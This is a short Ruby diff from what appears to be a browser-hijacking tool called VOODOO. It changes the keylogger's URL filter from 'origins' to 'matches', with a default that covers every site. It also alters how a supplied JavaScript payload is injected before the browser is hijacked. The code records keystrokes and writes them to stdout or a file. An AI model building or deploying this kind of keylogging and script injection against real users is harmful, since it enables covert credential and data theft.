@@ -29,8 +29,8 @@ module VOODOO
             end
 
             if options[:keylogger]
-                origins = options[:keylogger]['origins'] || ''
-                origins = origins.split(',')
+                matches = options[:keylogger]['matches'] || '*://*/*'
+                matches = matches.split(',')
                 url_include = options[:keylogger]['url_include'] || ''
 
                 output = 'stdout'
@@ -39,7 +39,7 @@ module VOODOO
                     output = open(options[:keylogger]['output'], 'a')
                 end
 
-                browser.keylogger(origins: origins, url_include: url_include) do |event|
+                browser.keylogger(matches: matches, url_include: url_include) do |event|
                     if output == 'stdout'
                         puts event
                     else
@@ -77,7 +77,7 @@ module VOODOO
             end
 
             if options[:js]
-                browser.add_script(options[:js])
+                browser.add_script(content: options[:js])
             end
 
             browser.hijack
